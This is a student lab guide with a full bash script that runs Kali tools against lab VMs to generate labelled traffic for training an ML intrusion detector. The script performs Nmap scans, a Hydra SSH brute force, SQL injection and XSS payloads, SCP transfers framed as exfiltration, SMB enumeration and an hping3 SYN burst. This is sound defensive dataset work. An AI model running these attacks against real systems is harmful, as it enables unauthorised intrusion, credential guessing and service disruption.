# AI Network Manager Project

## Full Attack Simulation Guide

*Attack-End Only: Kali-Based Lab Traffic Generation*

**Environment:** Isolated VCloud lab

**Attacker:** Kali Linux

**Targets:** Metasploitable, Ubuntu, Windows

**Purpose:** Generate labeled traffic for future ML-based network detection

**Author:** Bernard Appiah

**Important: This guide is designed for an authorized, isolated school lab only. Do not run these steps against public systems, school production systems, or any network you do not own or have explicit permission to test.**

# Table of Contents

1. Purpose and Scope

2. Lab Architecture

3. Ethical and Safety Boundaries

4. Kali Tool Installation

5. Project Folder Structure

6. Target Preparation Checklist

7. Attack Classes and ML Labels

8. Full Attack Demo Script

9. How to Run the Demonstration

10. Explanation of Each Attack Class

11. Dataset Labeling Plan

12. Troubleshooting

13. One-Week Priority Plan

14. References Consulted

# 1. Purpose and Scope

This document defines the attack-end of the AI Network Manager project. The goal is to generate repeatable, labeled network traffic from Kali Linux so that a future ML-based network manager can be trained and tested against realistic lab activity. The defensive ML side is intentionally not covered in detail here; it will be handled after the attack data-generation process is stable.

The guide focuses on safe simulation rather than destructive exploitation. The attack traffic is designed to be visible to packet capture tools, Zeek, Wireshark, tcpdump, CICFlowMeter, or similar feature extraction tools. Each attack class is separated so that the future ML dataset can be labeled cleanly.

# 2. Lab Architecture

The recommended lab architecture uses Kali Linux as the attack machine and several controlled systems as targets. The AI Manager will later observe traffic and classify it using ML. For now, the AI Manager can simply capture packets and logs.

| System | Role | Example IP Address | Purpose |
| --- | --- | --- | --- |
| Kali Linux | Attacker | 192.168.10.10 | Runs the attack-demo.sh script and generates labeled traffic. |
| Metasploitable | Vulnerable Linux target | 192.168.10.20 | Receives scans, SSH brute-force attempts, web payloads, and SCP transfers. |
| Ubuntu Server | Normal service target | 192.168.10.30 | Provides normal SSH/HTTP traffic and optional service baseline. |
| Windows Machine | Endpoint / SMB target | 192.168.10.40 | Used for SMB enumeration and Windows-style lateral movement traffic. |
| AI Manager | Observer / ML platform | 192.168.10.50 | Captures traffic and later runs detection or ML classification. |

# 3. Ethical and Safety Boundaries

- Run the script only inside an isolated VCloud lab that you are authorized to test.
- Use private RFC1918 addresses such as 10.0.0.0/8, 172.16.0.0/12, or 192.168.0.0/16.
- Do not aim the script at public IP addresses, school production networks, or cloud systems that are not part of the lab.
- Keep brute-force wordlists small because the purpose is traffic labeling, not account compromise.
- Keep DoS-like testing controlled and low-volume because the purpose is to generate recognizable traffic, not crash systems.
- Use harmless sample files for exfiltration simulation. Do not move real secrets, credentials, private files, or personal data.

# 4. Kali Tool Installation

Install the required tools on Kali Linux. These tools are used to generate traffic categories such as DNS, HTTP, SSH, Nmap reconnaissance, Hydra authentication attempts, SMB enumeration, SCP transfer, and controlled SYN burst traffic.

```bash
sudo apt update
sudo apt install -y nmap hydra curl dnsutils openssh-client smbclient sshpass hping3 netcat-traditional
```

Optional packet-capture tools on Kali:

```bash
sudo apt install -y wireshark tcpdump
```

# 5. Project Folder Structure

Create a clean project directory on Kali. The folders keep logs, payloads, sample files, and wordlists organized for GitHub documentation and professor demonstration.

```bash
mkdir -p ~/ai-network-manager-attacks
cd ~/ai-network-manager-attacks
mkdir -p logs wordlists payloads exfil
```

The script will automatically create a small demo password list and a harmless sample file if they do not already exist. This keeps the demonstration repeatable.

# 6. Target Preparation Checklist

Before running the attack script, verify that each target is reachable and that the intended services exist. This reduces troubleshooting during the live demonstration.

| Target | Preparation | Verification Command from Kali |
| --- | --- | --- |
| Metasploitable | Ensure the VM is powered on and reachable. SSH and web services should be available. | ping -c 2 192.168.10.20; nmap -sV 192.168.10.20 |
| Ubuntu Server | Ensure SSH or web service is available if used for normal traffic. | ping -c 2 192.168.10.30; curl -I http://192.168.10.30 |
| Windows Machine | Enable network discovery or SMB sharing only inside the lab if using SMB enumeration. | ping -c 2 192.168.10.40; smbclient -L //192.168.10.40/ -N |
| AI Manager | Start packet capture or log collection before launching attacks. | ping -c 2 192.168.10.50 |

# 7. Attack Classes and ML Labels

The attack-end script generates traffic for these ML labels. Run each class separately when creating a clean training dataset, or run the full demo when presenting the whole workflow.

| Class | Attack Type | Tool or Protocol | Expected Network Behavior |
| --- | --- | --- | --- |
| Normal | Browsing, SSH, DNS | curl, ssh, dig, nslookup | Baseline traffic, ordinary request frequency, common protocols. |
| Recon | Nmap scan, ping sweep | nmap -sn, -sS, -sV | Host discovery, port probing, service enumeration. |
| Brute Force | Hydra SSH attempts | hydra | Repeated authentication attempts and login failures. |
| Web Attack | SQLi and XSS-style requests | curl | HTTP requests containing suspicious parameters and payload patterns. |
| Exfiltration | SCP file transfer | scp, ssh | File transfer traffic with larger or distinct session behavior. |
| Lateral Movement | SMB enumeration and SSH movement | smbclient, ssh | Internal service discovery and remote login activity. |
| DoS | Controlled SYN burst | hping3 | Short burst of SYN packets to a lab web service. |

# 8. Full Attack Demo Script

Create the script on Kali with the following command:

```bash
nano attack-demo.sh
```

Paste the complete script below, then save it. Update the IP addresses at the top of the script to match your VCloud network.

**Listing 1. attack-demo.sh**

```bash

#!/bin/bash

# ============================================================

# AI Network Manager - Attack Traffic Generator

# Lab-only attack simulation script

# Author: Bernard Appiah

# Purpose: Generate labeled network traffic for ML IDS training

# ============================================================

# -----------------------------

# 0. SAFETY AND LAB BOUNDARY

# -----------------------------

# Use this script only inside your authorized VCloud lab.

# Do not point TARGET_SUBNET or target IP variables at public IPs.

# The script includes a private-IP check to reduce accidental misuse.

# -----------------------------

# 1. CONFIGURATION

# -----------------------------

TARGET_SUBNET="192.168.10.0/24"
META_IP="192.168.10.20"
UBUNTU_IP="192.168.10.30"
WINDOWS_IP="192.168.10.40"
AI_MANAGER_IP="192.168.10.50"

# Metasploitable default lab account. Change if your lab uses a different account.
META_USER="msfadmin"
META_PASS="msfadmin"

# Ubuntu lab account. Change to your actual Ubuntu test user.
UBUNTU_USER="student"
UBUNTU_PASS="student"

WORDLIST="./wordlists/demo-passwords.txt"
LOG_DIR="./logs"
EXFIL_DIR="./exfil"
EXFIL_FILE="./exfil/sample-sensitive-file.txt"
LABEL_LOG="./logs/attack-labels.csv"

mkdir -p "$LOG_DIR" "$EXFIL_DIR" "./wordlists" "./payloads"

# -----------------------------

# 2. HELPER FUNCTIONS

# -----------------------------

timestamp() {
    date +"%Y-%m-%d_%H-%M-%S"
}

now_iso() {
    date -Iseconds
}

banner() {
    echo
    echo "============================================================"
    echo "$1"
    echo "============================================================"
}

pause_between_attacks() {
    echo
    echo "[*] Waiting 10 seconds before the next action for cleaner labels..."
    sleep 10
}

init_files() {
    if [ ! -f "$WORDLIST" ]; then
        cat > "$WORDLIST" << 'EOF'
admin
password
123456
msfadmin
toor
kali
ubuntu
student
network
security
EOF
    fi

    if [ ! -f "$EXFIL_FILE" ]; then
        cat > "$EXFIL_FILE" << 'EOF'
Student Project Simulated Sensitive File
This file is harmless and used only for controlled ML traffic labeling.
Project: AI Network Manager
EOF
    fi

    if [ ! -f "$LABEL_LOG" ]; then
        echo "timestamp,class,activity,target,notes" > "$LABEL_LOG"
    fi
}

log_label() {
    local class="$1"
    local activity="$2"
    local target="$3"
    local notes="$4"
    echo "$(now_iso),$class,$activity,$target,$notes" >> "$LABEL_LOG"
}

is_private_ip() {
    local ip="$1"
    [[ "$ip" =~ ^10\. ]] && return 0
    [[ "$ip" =~ ^192\.168\. ]] && return 0
    [[ "$ip" =~ ^172\.(1[6-9]|2[0-9]|3[0-1])\. ]] && return 0
    return 1
}

safety_check() {
    banner "SAFETY CHECK"
    echo "[*] Checking target IPs..."

    for ip in "$META_IP" "$UBUNTU_IP" "$WINDOWS_IP" "$AI_MANAGER_IP"; do
        if ! is_private_ip "$ip"; then
            echo "[!] Safety check failed: $ip is not a private RFC1918 lab IP."
            echo "[!] Edit the script and use only your isolated VCloud lab IPs."
            exit 1
        fi
    done

    echo "[+] Safety check passed. All configured hosts are private lab IPs."
}

check_tools() {
    banner "TOOL CHECK"
    local missing=0
    for tool in nmap hydra curl dig nslookup ssh sshpass scp smbclient hping3; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            echo "[!] Missing tool: $tool"
            missing=1
        else
            echo "[+] Found: $tool"
        fi
    done

    if [ "$missing" -eq 1 ]; then
        echo
        echo "Install missing tools with:"
        echo "sudo apt update"
        echo "sudo apt install -y nmap hydra curl dnsutils openssh-client smbclient sshpass hping3 netcat-traditional"
        exit 1
    fi
}

# -----------------------------

# 3. NORMAL TRAFFIC

# -----------------------------

normal_traffic() {
    banner "CLASS: NORMAL TRAFFIC"
    log_label "Normal" "Start normal traffic generation" "Multiple" "DNS HTTP and SSH baseline"

    echo "[*] Running DNS lookups..."
    dig example.com > "$LOG_DIR/normal_dns_dig_$(timestamp).log" 2>&1
    nslookup example.com > "$LOG_DIR/normal_dns_nslookup_$(timestamp).log" 2>&1

    echo "[*] Simulating normal web browsing to lab services..."
    curl -I --max-time 5 "http://$META_IP" > "$LOG_DIR/normal_http_meta_$(timestamp).log" 2>&1
    curl -I --max-time 5 "http://$UBUNTU_IP" > "$LOG_DIR/normal_http_ubuntu_$(timestamp).log" 2>&1

    echo "[*] Simulating a normal SSH login to Metasploitable..."
    sshpass -p "$META_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
        "$META_USER@$META_IP" "whoami; hostname" \
        > "$LOG_DIR/normal_ssh_meta_$(timestamp).log" 2>&1

    log_label "Normal" "Completed normal traffic generation" "Multiple" "Baseline completed"
    echo "[+] Normal traffic completed."
}

# -----------------------------

# 4. RECONNAISSANCE

# -----------------------------

recon_scan() {
    banner "CLASS: RECONNAISSANCE"
    log_label "Recon" "Start ping sweep" "$TARGET_SUBNET" "Nmap host discovery"

    echo "[*] Running ping sweep against lab subnet..."
    nmap -sn "$TARGET_SUBNET" -oN "$LOG_DIR/recon_ping_sweep_$(timestamp).log"

    pause_between_attacks

    log_label "Recon" "Start TCP SYN scan" "$META_IP" "Nmap SYN scan"
    echo "[*] Running TCP SYN scan against Metasploitable..."
    sudo nmap -sS "$META_IP" -oN "$LOG_DIR/recon_syn_scan_meta_$(timestamp).log"

    pause_between_attacks

    log_label "Recon" "Start service version enumeration" "$META_IP" "Nmap service discovery"
    echo "[*] Running service/version enumeration against Metasploitable..."
    nmap -sV "$META_IP" -oN "$LOG_DIR/recon_service_enum_meta_$(timestamp).log"

    log_label "Recon" "Completed reconnaissance" "$META_IP" "Recon completed"
    echo "[+] Reconnaissance traffic completed."
}

# -----------------------------

# 5. BRUTE FORCE

# -----------------------------

ssh_bruteforce() {
    banner "CLASS: BRUTE FORCE"
    log_label "Brute Force" "Start controlled SSH brute force" "$META_IP" "Hydra small wordlist"

    echo "[*] Running controlled SSH brute-force attempt against Metasploitable..."
    echo "[*] This uses a small lab wordlist to create authentication-failure traffic."

    hydra -l "$META_USER" -P "$WORDLIST" "ssh://$META_IP" -t 2 -W 5 \
        -o "$LOG_DIR/bruteforce_ssh_meta_$(timestamp).log"

    log_label "Brute Force" "Completed controlled SSH brute force" "$META_IP" "Hydra completed"
    echo "[+] SSH brute-force simulation completed."
}

# -----------------------------

# 6. WEB ATTACKS

# -----------------------------

web_attack() {
    banner "CLASS: WEB ATTACK"
    log_label "Web Attack" "Start web attack payloads" "$META_IP" "SQLi and XSS test requests"

    echo "[*] Sending a normal web request first..."
    curl --max-time 5 "http://$META_IP/" \
        -o "$LOG_DIR/web_normal_request_$(timestamp).html" 2>/dev/null

    pause_between_attacks

    echo "[*] Sending SQL injection-style test payload to DVWA path if available..."
    curl --max-time 5 "http://$META_IP/dvwa/vulnerabilities/sqli/?id=1'%20OR%20'1'='1&Submit=Submit" \
        -o "$LOG_DIR/web_sqli_payload_$(timestamp).html" 2>/dev/null

    pause_between_attacks

    echo "[*] Sending XSS-style test payload to DVWA path if available..."
    curl --max-time 5 "http://$META_IP/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E" \
        -o "$LOG_DIR/web_xss_payload_$(timestamp).html" 2>/dev/null

    log_label "Web Attack" "Completed web payload requests" "$META_IP" "Web attack simulation completed"
    echo "[+] Web attack simulation completed."
}

# -----------------------------

# 7. EXFILTRATION SIMULATION

# -----------------------------

exfiltration_simulation() {
    banner "CLASS: EXFILTRATION"
    log_label "Exfiltration" "Start SCP transfer simulation" "$META_IP" "Harmless sample file transfer"

    echo "[*] Simulating file movement using SCP."
    echo "[*] File: $EXFIL_FILE"
    echo "[*] This is a harmless sample file for ML traffic labeling."

    # Upload mode: Kali sends a harmless sample file to the target.
    # This still creates SCP file-transfer traffic for the ML pipeline.
    sshpass -p "$META_PASS" scp -o StrictHostKeyChecking=no "$EXFIL_FILE" \
        "$META_USER@$META_IP:/tmp/exfil-test-$(timestamp).txt" \
        > "$LOG_DIR/exfil_scp_upload_meta_$(timestamp).log" 2>&1

    pause_between_attacks

    # Pull mode: Kali pulls a harmless file from the target.
    # This better represents exfiltration direction when the target account is authorized.
    sshpass -p "$META_PASS" ssh -o StrictHostKeyChecking=no "$META_USER@$META_IP" \
        "echo 'Harmless victim-side sample for exfil simulation' > /tmp/victim-side-sample.txt" \
        > "$LOG_DIR/exfil_prepare_remote_file_$(timestamp).log" 2>&1

    sshpass -p "$META_PASS" scp -o StrictHostKeyChecking=no \
        "$META_USER@$META_IP:/tmp/victim-side-sample.txt" \
        "./exfil/pulled-from-target-$(timestamp).txt" \
        > "$LOG_DIR/exfil_scp_pull_meta_$(timestamp).log" 2>&1

    log_label "Exfiltration" "Completed SCP transfer simulation" "$META_IP" "SCP file movement completed"
    echo "[+] Exfiltration simulation completed."
}

# -----------------------------

# 8. LATERAL MOVEMENT SIMULATION

# -----------------------------

lateral_movement() {
    banner "CLASS: LATERAL MOVEMENT"
    log_label "Lateral Movement" "Start SMB enumeration" "$WINDOWS_IP" "SMB share discovery"

    echo "[*] Simulating SMB enumeration against Windows target..."
    smbclient -L "//$WINDOWS_IP/" -N \
        > "$LOG_DIR/lateral_smb_enum_windows_$(timestamp).log" 2>&1

    pause_between_attacks

    log_label "Lateral Movement" "Start SSH internal movement simulation" "$META_IP" "SSH host-to-host style activity"
    echo "[*] Simulating internal SSH movement to Metasploitable..."
    sshpass -p "$META_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
        "$META_USER@$META_IP" "hostname; ip addr | head" \
        > "$LOG_DIR/lateral_ssh_meta_$(timestamp).log" 2>&1

    log_label "Lateral Movement" "Completed lateral movement simulation" "Multiple" "SMB and SSH movement completed"
    echo "[+] Lateral movement simulation completed."
}

# -----------------------------

# 9. CONTROLLED DOS-LIKE TRAFFIC

# -----------------------------

dos_simulation() {
    banner "CLASS: CONTROLLED DOS-LIKE TRAFFIC"
    log_label "DoS" "Start controlled SYN burst" "$META_IP" "Low-count hping3 SYN burst"

    echo "[!] This is a controlled lab-only SYN burst."
    echo "[!] Keep this low-rate. The goal is traffic generation, not disruption."
    echo "[!] Packet count is intentionally limited to 100."

    sudo hping3 -S "$META_IP" -p 80 -c 100 --fast \
        > "$LOG_DIR/dos_syn_burst_meta_$(timestamp).log" 2>&1

    log_label "DoS" "Completed controlled SYN burst" "$META_IP" "100 SYN packets sent"
    echo "[+] Controlled DoS-like traffic completed."
}

# -----------------------------

# 10. RUN ALL

# -----------------------------

run_all() {
    banner "RUNNING FULL ATTACK TRAFFIC DEMO"

    normal_traffic
    pause_between_attacks

    recon_scan
    pause_between_attacks

    ssh_bruteforce
    pause_between_attacks

    web_attack
    pause_between_attacks

    exfiltration_simulation
    pause_between_attacks

    lateral_movement
    pause_between_attacks

    dos_simulation

    banner "FULL DEMO COMPLETED"
    echo "[*] Label log saved to: $LABEL_LOG"
    echo "[*] Tool logs saved in: $LOG_DIR"
}

# -----------------------------

# 11. MAIN MENU

# -----------------------------

init_files
safety_check
check_tools

while true; do
    echo
    echo "AI Network Manager - Attack Traffic Generator"
    echo "------------------------------------------------"
    echo "1. Generate Normal Traffic"
    echo "2. Reconnaissance: Nmap + Ping Sweep"
    echo "3. Brute Force: Hydra SSH"
    echo "4. Web Attack: SQLi + XSS"
    echo "5. Exfiltration: SCP Transfer"
    echo "6. Lateral Movement: SMB + SSH"
    echo "7. Controlled DoS-like SYN Burst"
    echo "8. Run Full Demo"
    echo "9. Exit"
    echo "------------------------------------------------"
    read -p "Select option: " choice

    case $choice in
        1) normal_traffic ;;
        2) recon_scan ;;
        3) ssh_bruteforce ;;
        4) web_attack ;;
        5) exfiltration_simulation ;;
        6) lateral_movement ;;
        7) dos_simulation ;;
        8) run_all ;;
        9) echo "Exiting."; exit 0 ;;
        *) echo "Invalid option." ;;
    esac
done
```

# 9. How to Run the Demonstration

After saving the script, make it executable and run it from the project directory.

```bash
chmod +x attack-demo.sh
./attack-demo.sh
```

Recommended professor demonstration flow:

1. Start packet capture on the AI Manager using tcpdump, Wireshark, Zeek, or another capture method.

2. Run option 1: Generate Normal Traffic.

3. Wait for the class to complete and observe the label log entry.

4. Run option 2: Reconnaissance.

5. Run option 3: Brute Force.

6. Run option 4: Web Attack.

7. Run option 5: Exfiltration.

8. Run option 6: Lateral Movement if time allows.

9. Run option 7: Controlled DoS only if the lab is stable and isolated.

10. Stop packet capture and save the PCAP/log files for the ML side of the project.

# 10. Explanation of Each Attack Class

## 10.1 Normal Traffic

Normal traffic gives the ML system a baseline. Without normal traffic, the model may learn that every event is malicious. The script generates DNS lookups, web requests, and a legitimate SSH login. This class should be captured before attacks so the dataset contains benign examples.

## 10.2 Reconnaissance

Reconnaissance simulates host discovery and service enumeration. The script uses Nmap for ping sweep, SYN scan, and service version detection. This class should create patterns such as many destination ports, repeated probes, and host discovery traffic.

## 10.3 Brute Force

The brute-force class uses Hydra against SSH with a small wordlist. The goal is to create repeated login attempts that your future model can associate with credential attacks. The script uses a deliberately small password list because the objective is labeling and detection, not attacking real systems.

## 10.4 Web Attack

The web attack class sends SQL injection-style and XSS-style requests against a vulnerable web path such as DVWA on Metasploitable. If DVWA requires login cookies in your setup, you can still use the script to generate suspicious HTTP requests, or you can manually browse DVWA/Juice Shop while packet capture is running.

## 10.5 Exfiltration

The exfiltration class uses SCP to create file-transfer traffic. The script performs both upload-style and pull-style transfers with harmless sample files. The pull-style action better represents exfiltration direction because the attacker machine retrieves a file from the target. No real sensitive data should be used.

## 10.6 Lateral Movement

The lateral movement class simulates internal movement behavior using SMB enumeration and SSH access. This is a simplified representation suitable for a one-week project. A more advanced future version could include Active Directory, Windows event logs, and MITRE ATT&CK Atomic Red Team tests.

## 10.7 Controlled DoS-like Traffic

The DoS class uses hping3 to generate a small SYN burst. This should remain low-volume and lab-only. The objective is not to crash Metasploitable or overload VCloud; it is to create a recognizable short burst of SYN traffic for ML labeling.

# 11. Dataset Labeling Plan

The script writes a CSV label log to ./logs/attack-labels.csv. This log can help you align packet-capture time windows with the traffic class that was running. For the ML stage, each time range can be mapped to a class label.

| Script Option | ML Label | Main Evidence in Traffic |
| --- | --- | --- |
| 1. Generate Normal Traffic | Normal | DNS lookups, HTTP HEAD/GET requests, one normal SSH login. |
| 2. Reconnaissance | Recon | Ping sweep, SYN scan, version enumeration. |
| 3. Brute Force | Brute Force | Repeated SSH authentication attempts. |
| 4. Web Attack | Web Attack | HTTP requests with SQLi/XSS-style parameters. |
| 5. Exfiltration | Exfiltration | SCP file transfer sessions. |
| 6. Lateral Movement | Lateral Movement | SMB enumeration and internal SSH activity. |
| 7. Controlled DoS-like SYN Burst | DoS | Short burst of SYN packets to port 80. |

Suggested capture naming convention:

```bash
normal_traffic.pcap
recon_nmap.pcap
bruteforce_hydra_ssh.pcap
web_sqli_xss.pcap
exfil_scp.pcap
lateral_smb_ssh.pcap
dos_syn_burst.pcap
```

# 12. Troubleshooting

| Problem | Likely Cause | Fix |
| --- | --- | --- |
| Hydra fails immediately | SSH not reachable or wrong credentials/username variable. | Run nmap -sV TARGET_IP and verify port 22 is open. |
| DVWA curl requests do not show expected page | DVWA may require login cookies or security level configuration. | Use the requests for traffic generation or manually browse DVWA/Juice Shop during capture. |
| smbclient returns connection errors | Windows SMB may be disabled or firewall blocks SMB. | Enable SMB sharing only inside the lab or treat this class as optional. |
| hping3 does not run | Root privileges required or tool missing. | Run sudo apt install hping3 and execute script with sudo when selecting DoS. |
| ML labels are mixed | Multiple classes were run without pauses or separate captures. | Run one class at a time or use the attack-labels.csv timestamp log. |

# 13. One-Week Priority Plan

Because the deadline is one week, prioritize a clean and demonstrable result over too many attack categories. The strongest minimum viable attack-end is:

1. Normal traffic baseline.

2. Reconnaissance with Nmap.

3. Brute force with Hydra against SSH.

4. Web attack requests against DVWA/Juice Shop or Metasploitable web paths.

5. SCP file transfer for exfiltration simulation.

Add lateral movement and controlled DoS only after the first five classes work reliably and are captured cleanly.

# 14. References Consulted

These references were consulted to keep the guide aligned with current tool purposes and documentation. They are included for your GitHub README and professor review.

- **Nmap Reference Guide:** https://nmap.org/book/man.html
- **THC Hydra GitHub Repository:** https://github.com/vanhauser-thc/thc-hydra
- **OWASP Juice Shop Project:** https://owasp.org/www-project-juice-shop/
- **Zeek Network Security Monitor:** https://zeek.org/
- **CICFlowMeter - Canadian Institute for Cybersecurity:** https://www.unb.ca/cic/research/applications.html
- **Wireshark User Guide:** https://www.wireshark.org/docs/wsug_html_chunked/
- **tcpdump capture guidance in Wireshark User Guide:** https://www.wireshark.org/docs/wsug_html_chunked/AppToolstcpdump.html
